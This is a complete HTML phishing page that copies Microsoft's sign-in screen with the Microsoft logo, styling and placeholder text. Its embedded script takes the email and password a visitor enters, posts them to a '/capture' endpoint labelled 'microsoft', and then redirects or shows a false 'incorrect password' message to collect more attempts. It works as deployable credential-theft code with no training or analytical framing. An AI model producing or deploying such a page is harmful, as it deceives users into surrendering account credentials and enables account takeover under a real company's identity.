<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in to your account</title>
<style>
  body{margin:0;font-family:"Segoe UI",Tahoma,Geneva,Verdana,sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .box{background:#fff;padding:44px;width:440px;box-shadow:0 2px 6px rgba(0,0,0,.2);border-radius:4px}
  .logo{margin-bottom:16px}
  h1{font-size:24px;font-weight:600;margin:0 0 24px}
  input{width:100%;border:none;border-bottom:1px solid #666;padding:8px 0;margin-bottom:24px;font-size:15px;outline:none;background:transparent}
  input:focus{border-bottom:2px solid #0067b8}
  .btn{background:#0067b8;color:#fff;border:none;padding:8px 32px;font-size:15px;cursor:pointer;float:right}
  .btn:hover{background:#005da6}
  .msg{color:#e81123;font-size:14px;margin-top:16px;clear:both}
</style>
</head>
<body>
<div class="box">
  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" width="108" alt="Microsoft">
  <h1>Sign in</h1>
  <form id="f">
    <input name="user" type="email" placeholder="Email, phone, or Skype" required autofocus>
    <input name="pass" type="password" placeholder="Password" required>
    <button type="submit" class="btn">Next</button>
    <p id="msg" class="msg"></p>
  </form>
</div>
<script>
document.getElementById('f').addEventListener('submit', async e => {
  e.preventDefault();
  const fd = new FormData(e.target);
  const r = await fetch('/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user:fd.get('user'),pass:fd.get('pass'),brand:'microsoft'})});
  const j = await r.json().catch(()=>({}));
  if(j.redirect){window.location=j.redirect;return;}
  document.getElementById('msg').textContent = 'Your account or password is incorrect.';
});
</script>
</body>
</html>
